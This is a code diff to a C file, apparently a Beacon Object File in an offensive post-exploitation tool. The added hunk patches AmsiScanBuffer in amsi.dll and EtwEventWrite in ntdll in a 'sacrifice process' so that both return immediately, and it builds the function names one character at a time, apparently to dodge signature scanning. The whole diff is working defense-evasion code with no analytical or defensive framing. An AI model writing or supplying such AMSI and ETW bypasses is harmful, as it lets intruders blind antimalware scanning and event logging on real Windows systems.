@@ -1207,6 +1207,50 @@ DWORD WINAPI bof_entry(void* param) {
     if (!pVirtualAlloc || !pVirtualProtect || !pVirtualFree ||
         !pGetProcessHeap || !pHeapAlloc || !pHeapFree || !pExitThread) return 2;
 
+    /* ------------------------------------------------------------------- */
+    /* Step 3b: Patch AMSI and ETW in the sacrifice process                */
+    /* ------------------------------------------------------------------- */
+
+    /* Patch AMSI */
+    {
+        char s_amsi[9];
+        s_amsi[0] = 'a'; s_amsi[1] = 'm'; s_amsi[2] = 's'; s_amsi[3] = 'i';
+        s_amsi[4] = '.'; s_amsi[5] = 'd'; s_amsi[6] = 'l'; s_amsi[7] = 'l'; s_amsi[8] = '\0';
+        HMODULE hAmsi = pLoadLibraryA(s_amsi);
+        if (hAmsi) {
+            char s_asb[16];
+            s_asb[0]  = 'A'; s_asb[1]  = 'm'; s_asb[2]  = 's'; s_asb[3]  = 'i';
+            s_asb[4]  = 'S'; s_asb[5]  = 'c'; s_asb[6]  = 'a'; s_asb[7]  = 'n';
+            s_asb[8]  = 'B'; s_asb[9]  = 'u'; s_asb[10] = 'f'; s_asb[11] = 'f';
+            s_asb[12] = 'e'; s_asb[13] = 'r'; s_asb[14] = '\0';
+            void* pAsb = (void*)pGetProcAddress(hAmsi, s_asb);
+            if (pAsb) {
+                DWORD oldp = 0;
+                pVirtualProtect(pAsb, 3, 0x40, &oldp);
+                unsigned char* p = (unsigned char*)pAsb;
+                p[0] = 0x31; p[1] = 0xC0; p[2] = 0xC3;
+                pVirtualProtect(pAsb, 3, oldp, &oldp);
+            }
+        }
+    }
+
+    /* Patch ETW: EtwEventWrite in ntdll */
+    {
+        char s_etw[14];
+        s_etw[0]  = 'E'; s_etw[1]  = 't'; s_etw[2]  = 'w'; s_etw[3]  = 'E';
+        s_etw[4]  = 'v'; s_etw[5]  = 'e'; s_etw[6]  = 'n'; s_etw[7]  = 't';
+        s_etw[8]  = 'W'; s_etw[9]  = 'r'; s_etw[10] = 'i'; s_etw[11] = 't';
+        s_etw[12] = 'e'; s_etw[13] = '\0';
+        void* pEtw = (void*)find_export(ntdll_base, s_etw);
+        if (pEtw) {
+            DWORD oldp = 0;
+            pVirtualProtect(pEtw, 3, 0x40, &oldp);
+            unsigned char* p = (unsigned char*)pEtw;
+            p[0] = 0x31; p[1] = 0xC0; p[2] = 0xC3;
+            pVirtualProtect(pEtw, 3, oldp, &oldp);
+        }
+    }
+
     HANDLE hHeap = pGetProcessHeap();
     if (!hHeap) return 3;
 
